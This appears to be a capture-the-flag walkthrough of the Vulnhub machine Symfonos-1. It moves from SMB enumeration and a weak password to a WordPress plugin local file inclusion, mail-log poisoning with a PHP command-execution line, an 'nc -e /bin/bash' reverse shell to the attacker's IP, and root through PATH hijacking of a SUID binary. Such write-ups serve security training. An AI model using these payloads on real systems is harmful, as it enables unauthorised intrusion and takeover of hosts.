---
author: "faizul"
title: "Symfonos-1"
date: 2020-09-01T12:00:06+09:00
description: "Symfonos-1 Vulnhub machine series"
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: faizul
image: images/vulnhub/vulnhub.png
tags: 
- pentest
- symfonos-series
- vulnhub
---

![9df68848e0de9e3df9d10e5736d66431.png](/images/vulnhub/symfonos-1/fca4ff9ba3464c5994ebfd1045293025.png)

- Lab setup
VMWare setup with vmnet0 and Kali as attacker attached on vmnet0. 

- IP
192.168.43.165

## Recon
This stage we get to know our victim. Doing engagement to know which port are opened, then enumerate the available port to recognize the attacking surface. 

### nmap

`sudo nmap -sSCV -A --script vuln -oA nmap/full-agressive -iL ip`

- **Opened port**
	- 22
	- 25
	- 80
	- 139
	- 445

### gobuster

`gobuster dir -u http://192.168.43.165 -w /usr/share/wordlist/dirb/big.txt -x php,html,txt -o gobuster/enum-80`

### enum4linux(smb enum)
since there are smb port open, we can enum it to look further of what we can collect to gain initial foothold.

`enum4linux -a 192.168.43.165`


![b8bd2b7ef79b5894f4cbb3110434e425.png](/images/vulnhub/symfonos-1/e2daf5afceb245b781774662e3f49044.png)

We got result back where we can log into smb as `anonymous` and take a peek content inside. 

Before that, i add the victim ip into my `/etc/hosts` as `symfonos.local`. From here, we can just use `thunar` in Network section to log into smb. other than that, we can simply use `smbclient`. 


![1cedeec9c533f862c2f142be4abdc6bb.png](/images/vulnhub/symfonos-1/22826e09e81e40f097be915e5e4777df.png)



![66ace62789736e7e8a87221bf42d99aa.png](/images/vulnhub/symfonos-1/c05dc5505e6b480587ec348127ed84d0.png)

```text

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

From the `anonymous` smb login, we can get is the warning from piss off bos who threat to fire anyone with common password.

Lets try this to login into helios account and try to collect the loot from there instead. 

On the smb options, set the user as helios, domain as `symfonos.localdomain` and we can try 3 of the password we get from the loot. Password `qwerty` will let us go into helios smd dir. 



![fccb3d842341867cb98bd1f56cd79527.png](/images/vulnhub/symfonos-1/1f1d56db7d2248418e919c2a1ad85437.png)

From helios account, there are 2 files and here are the contents.

- **research.txt** content
```text
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```

- **todo.txt** content
```text
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

On these 2 looted files, there is nothing much interesting except we know that the responsible person love to dance, watching dexter, doping research about the god of sun and the most interesting part is /h3l105. 


We key in this into the address bar after the ip address and we will be served into this crappy website. 


![c79312de05cb18973f9e4eab8bb22fa8.png](/images/vulnhub/symfonos-1/56fbcbff3daf45f9812a74ed6f22c139.png)

So its actually a wordpress site. Next we going to use wpscan to enumerate this site. The attacking surface for wordpress is actually the plugin. The core wordpress is one of target but usually plugin always occur to contain interesting bugs where some of it installed, unused and left not updated. 

fire up the wpscan using this command `wpscan -u http://symfonos.local/h3l105 --enumerate p -o wpscan/enumerate-plugin`

From this, we can recognize the Local File Inclusion vulnerability. 

```bash
[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9044
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
```


![96548f509f044a72fd5bfb8707f713cd.png](/images/vulnhub/symfonos-1/a78471f69c68476b8d9f3266fc7fb593.png)

## Gaining initial foothold

On the searchsploit, we can get the simple POC for this which is 
44340. Simply execute `searchsploit -m 44340` will mirror the exploit on current directory. 

```text
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-edit
or/                                                                            
Vendor: Site Editor                                                            
Tested version: 1.1.1                                                          
CVE ID: CVE-2018-7422                                                          
                                                                               
** CVE description **                                                          
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 fo
r WordPress allows remote attackers to retrieve arbitrary files via the ajax_pa
th parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.p
hp.                                                                            
              
** Technical details **                                                        
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.ph
p:5, the value of the ajax_path parameter is used for including a file with PHP
’s require_once(). This parameter can be controlled by an attacker and is not p
roperly sanitized.                                                             

Vulnerable code:                                                               
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && fil
e_exists( $_REQUEST['ajax_path'] ) ){                                          
    require_once $_REQUEST['ajax_path'];                                       
}                                                                              

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

According to this, we can execute os commnad using LFI method by invoking `http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd` where os command reside after `ajax_path`. 


For initial access, remember the earlier available SMTP port, we going to abuse it. Basically we will do this in a nutshell : -

1. Set mail from random user. In this case, im using my cool nickname
2. Set recipient to helios
3. Set data followed by malicious code for us to send command on attacker machine


In order to do this, we can either connect to the mail using telnet and netcat

- **Netcat**
```bash
sudo rlwrap nc -vvvv 192.168.43.194 25 

Trying 192.168.43.165...                                                                                            
Connected to 192.168.43.165.                                                                                                                 
Escape character is '^]'.                                                                                                        
                                                                                                                                                   
220                                                                                                                              
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)                                                                 
500 5.5.2 Error: bad syntax                                                                                         
502 5.5.2 Error: command not recognized                                                                             
MAIL FROM: <mark>                                                                                                                
250 2.1.0 Ok                                                                                                         
RCPT TO: Helios                                                                                                               
250 2.1.5 Ok                                                                                                         
data                                                                                                                             
354 End data with <CR><LF>.<CR><LF>                                                                                  
<?php system($_GET['cmd']); ?>                                                                                                     
250 2.0.0 Ok: queued as DD26140B94                                                                                  
421 4.4.2 symfonos.localdomain Error: timeout exceeded                                                              
Connection closed by foreign host.                
```

- **Telnet**
```bash
telnet 192.168.43.194 25

symfonos.local [192.168.43.165] 25 (smtp) open                                                                      
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)                                                                 
mail from: fyezool                                                                                                  
250 2.1.0 Ok                                                                                                        
rcpt to: helios                                                                                                     
250 2.1.5 Ok                                                                                                        
data                                                                                                                
354 End data with <CR><LF>.<CR><LF>                                                                                 
<?php system($_GET['cmd']); ?> 
```

After this is done, we can use the payload on LFI os command injection. 


Before that, setup netcat on attacker machine so we can receive get the reverse shell for privilege escalation. 

```bash
rlwrap nc -nvlp 4444
```

Then run this on browser
`http:symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/bash 192.168.43.194 4444`


![aa02889e9eee4d594a2eec9db505d4d7.png](/images/vulnhub/symfonos-1/3155ea584af146d89d15aa26351e63a3.png)

Once we get the reverse shell, we can get fancy bash shell by using this command `python -c 'import pty;pty.spawn("/bin/bash")'`




![3c0f5d7cfa2239edbab1109420cd7d5c.png](/images/vulnhub/symfonos-1/87abd84ca23344f0ad24e6ad5c49645c.png)
Here, we are helios.

## Privilege Escalation
To escalate into root, we can use this command to find useful command. 

`find / -user root -perm -4000 -print 2>/dev/null`

This command will print out and fiter junk output from the terminal. 


![a27290cb355d459344cc3fe74ddda45f.png](/images/vulnhub/symfonos-1/1e06befddf8b4014878ffd2edf5837be.png)


We found that `/opt/statuscheck` is quite weird here. We can use strings to check it out. 



![c7d73775d0fa80a553684df7af7c3635.png](/images/vulnhub/symfonos-1/3e11d8c71b9f482d87b1386841de9950.png)

This binary call `curl` directly. We can use this to elevate permission and gain root. 

- **Escalation summary**
from here, we are basically : -
1. cd to /tmp
2. echo `shebang` to curl
3. echo `/bin/bash` to curl
4. gave 755 permission on curl
5. export /tmp to path
6. run /opt/statuscheck


```bash
helios@symfonos:/tmp$ echo -n "#!" > curl
echo -n "#!" > curl
helios@symfonos:/tmp$ echo "/bin/sh" >> curl
echo "/bin/sh" >> curl
helios@symfonos:/tmp$ echo "/bin/sh" >> curl
echo "/bin/sh" >> curl
helios@symfonos:/tmp$ chmod 755 curl
chmod 755 curl
helios@symfonos:/tmp$ import PATH=/tmp:$PATH
import PATH=/tmp:$PATH
bash: import: command not found
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
helios@symfonos:/tmp$ /opt/statuscheck
/opt/statuscheck
# whoami
whoami
root
# 
```


## Flaggy flag

![975a9c7c5cd0a00b7efe6e3925dee148.png](/images/vulnhub/symfonos-1/f3a34b6d8b9f4f80aa52eed6ce06952a.png)

## Summary
- Update wordpress installation
- patch patch patch
- be careful of choosing + install third party plugin. more plugin, more attacking surfaces
- check for plugin updates, patch!
- uninstall/disable plugin if not use, less is more!
- Attacking summary : LFI -> Mailbox poison -> Reverse Shell -> Initial foothold -> SUID /opt/statuscheck -> rooted!


![80ad753ddac1ca17e93d7fbd30d4fe48.png](/images/vulnhub/symfonos-1/6bb5d28f94624216b450edfb23ea94d4.png)

## References
1. https://infosecjohn.blog/posts/vulnhub-symfonos-1/
2. https://medium.com/@markonsecurity/symfonos-1-walkthrough-vulnhub-df08dbcb0d36
3. https://0x23b.github.io/posts/vulnhub/2019-08-08-vulnhub_symfonos1_writeup/